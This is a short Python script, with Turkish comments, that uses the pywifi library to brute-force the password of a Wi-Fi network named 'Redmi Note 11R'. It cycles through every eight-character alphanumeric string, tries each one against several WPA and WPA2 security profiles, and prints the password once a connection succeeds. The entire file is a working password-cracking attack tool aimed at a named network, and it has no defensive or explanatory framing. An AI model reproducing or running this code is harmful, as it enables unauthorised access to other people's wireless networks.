import pywifi
from pywifi import const
import itertools
import time


wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]


SSID = "Redmi Note 11R"

security_types = [
    {'akm': [const.AKM_TYPE_WPA2PSK], 'cipher': const.CIPHER_TYPE_CCMP},  # WPA2-Personal
    {'akm': [const.AKM_TYPE_WPA2PSK], 'cipher': const.CIPHER_TYPE_TKIP},  # WPA2-TKIP
    {'akm': [const.AKM_TYPE_WPAPSK], 'cipher': const.CIPHER_TYPE_TKIP},   # WPA-TKIP
    {'akm': [const.AKM_TYPE_WPAPSK], 'cipher': const.CIPHER_TYPE_CCMP},   # WPA-CCMP
    {'akm': [const.AKM_TYPE_WPAPSK], 'cipher': const.CIPHER_TYPE_NONE},   # WPA-None
]


def find_password():
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Karakter seti
    min_length = 8  # Şifre minimum uzunluğu
    max_length = 8  # Şifre maksimum uzunluğu

    for length in range(min_length, max_length + 1):
        for combination in itertools.product(charset, repeat=length):
            password = "".join(combination)
            
            for security in security_types:
                profile = pywifi.Profile()
                profile.ssid = SSID
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm = security['akm']
                profile.cipher = security['cipher']
                profile.key = password

                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)
                time.sleep(0.5)  # Bağlanmak için bekleme süresi

                if iface.status() == const.IFACE_CONNECTED:
                    print(f"Password Found: {password} - Security Type: {security}")
                    return
                else:
                    print(f"Password Tried: {password} - Security Type: {security}")
                iface.disconnect()
                time.sleep(0.5)

    print("Password Not Found.")

def main():
    find_password()

if __name__ == "__main__":
    main()
